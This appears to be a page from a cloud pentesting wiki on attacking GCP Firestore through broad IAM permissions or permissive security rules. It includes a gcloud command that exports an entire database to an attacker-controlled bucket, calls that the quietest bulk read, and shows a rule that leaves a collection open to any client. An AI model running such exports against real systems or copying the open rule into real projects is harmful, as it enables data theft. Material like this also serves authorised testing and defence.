---
title: "Firestore: reading collections through broad IAM and security-rule gaps"
order: 6
description: "Attacking Firestore and Datastore: reading and writing collections through broad database IAM or security-rule gaps."
keywords:
  - Firestore
  - Datastore
  - collection
  - database IAM
  - security rules
  - NoSQL
---

# Firestore

Firestore (and its Datastore mode) is a serverless NoSQL database reached through IAM for server-side access and through **security rules** for client SDK access. A principal with `datastore.entities.get`/`list` reads collections directly, and permissive security rules (a rule that allows read where it should not) expose the same data to an unauthenticated client.

## Server-side read with IAM

```bash
gcloud firestore databases list
gcloud firestore export gs://<attacker-or-reachable-bucket>   # bulk dump with datastore.databases.export
```

## Client-side read through weak rules

```
// a rule like this exposes the collection to any client
match /users/{doc} { allow read: if true; }
```

## Exploitation notes

- `datastore.databases.export` to a bucket you control dumps the whole database offline, the quietest bulk read.
- Firestore in Native mode is driven from app SDKs; a leaked Firebase web config plus an over-broad rule is a direct unauthenticated read, independent of Cloud IAM.

## Tools

- **gcloud** (`firestore export`, `firestore databases list`).
- **Firebase SDK / REST**: client-path reads against weak rules.

## References

- [HackTricks Cloud: GCP Firestore](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google Cloud: Firestore security rules](https://firebase.google.com/docs/firestore/security/get-started)
